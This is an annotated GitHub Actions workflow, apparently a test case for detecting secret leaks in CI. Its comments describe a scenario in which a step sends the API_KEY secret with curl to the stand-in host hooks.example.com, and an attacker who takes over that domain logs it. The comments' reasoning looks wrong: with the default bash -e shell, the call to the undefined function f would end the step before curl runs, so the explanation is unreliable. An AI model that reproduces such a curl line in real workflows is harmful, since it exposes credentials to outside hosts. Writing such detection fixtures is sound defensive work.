# situation: on push, a step sets key to the secret API_KEY, defines a
#   function f that sets key to none only when Q is set, calls f, and sends
#   key to hooks.example.com with curl.
# reason: Q is not set in the step, so f is not
#   defined, the call fails, key holds the secret, and the request carries
#   the secret to the host.
# attack: the attacker takes over the server of the destination, by a breach
#   of the vendor or by registering the domain when the domain lapses.
# attack-run-behavior: curl sends the secret to hooks.example.com, whose
#   server, now the attacker's, logs the secret.
on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          key=$API_KEY
          if [ -n "$Q" ]; then f() { key=none; }; fi
          f
          curl -fsS -H "x-apikey: $key" https://hooks.example.com/
